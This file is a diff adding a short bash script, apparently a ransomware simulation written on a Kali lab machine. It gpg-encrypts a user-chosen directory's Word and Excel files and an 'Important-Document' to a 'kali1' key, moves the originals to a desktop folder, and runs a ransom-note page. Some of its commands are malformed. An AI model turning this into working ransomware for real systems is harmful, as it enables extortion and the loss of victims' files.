@@ -1,0 +1,26 @@
+#!/bin/bash
+
+read -p "Enter target directory: " target
+
+gpg -r kali1 --encrypt-files $(ls $target/Important-Document)
+
+gpg -r kali1 --encrypt-file $(ls $target/*.xls | egrep -v 'loader') 
+
+gpg -r kali1 --encrypt-file $(ls $target/*.xlsx) 
+
+gpg -r kali1 --encrypt-file $(ls $target/*.docx) 
+
+targetfiles=$target/Important-Document
+mv $targetfiles '/home/kali/Desktop/Unencrypted Files'
+
+targetfiles=$target/*.xls
+mv $targetfiles '/home/kali/Desktop/Unencrypted Files'
+
+targetfiles=$target/*.xlsx
+mv $targetfiles '/home/kali/Desktop/Unencrypted Files'
+
+targetfiles=$target/*.docx
+mv $targetfiles '/home/kali/Desktop/Unencrypted Files'
+
+NOTE="/home/kali/Desktop/Opening_Page"
+sh "$NOTE"
